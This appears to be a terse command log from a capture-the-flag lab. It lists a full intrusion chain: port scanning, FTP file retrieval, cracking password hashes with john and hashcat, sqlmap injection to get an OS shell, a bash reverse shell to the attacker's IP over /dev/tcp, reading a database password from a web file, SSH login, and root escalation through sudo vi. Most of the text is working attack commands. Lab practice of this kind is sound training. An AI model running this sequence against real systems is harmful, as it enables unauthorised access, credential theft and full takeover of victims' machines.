# Searching for open ports.
sudo nmap -sV -sC [ip]
# Task 1 solved.

ftp [ip]
# Task 2 solved.
# Task 3 solved.

get [file]

# Task 4 solved.
[Task4] [file] > hash.txt

john --wordlist=rockyou.txt hash.txt
# Open the directory and get the hash

hashcat -m 0 admin.txt rockyou.txt
# Task 5 solved.

sqlmap --help
# Task 6 solved.

sqlmap -u "http://[ip]/dashboard.php?search=test" --cookie="PHPSESSID=[SESSIONID]" --batch --os-shell

# Use of reverse shell due to I cannot access to dashboard.php from --os-shell
# Listener from port 443 in attacker's computer.
nc -lvnp 443

# Creates and interactive bash in victim's via --os-shell 
# and send all the info to the attacker's on port 443.
bash -c "bash -i >& /dev/tcp/[attacker's ip]/443 0>&1"

# Stabilize bash.
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CRTL + Z
stty raw -echo
fg
export TERM-xterm

# We found postgres password:
cat /var/www/html/dashboard.php

# Using password to login with ssh.
ssh postgres@[ip]

sudo -l
# Task 7 solved.

# User flag
cat [file]

# Root flag
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
#CTRL + C
:!/bin/bash
# we get root privileges
cat /root/[file]
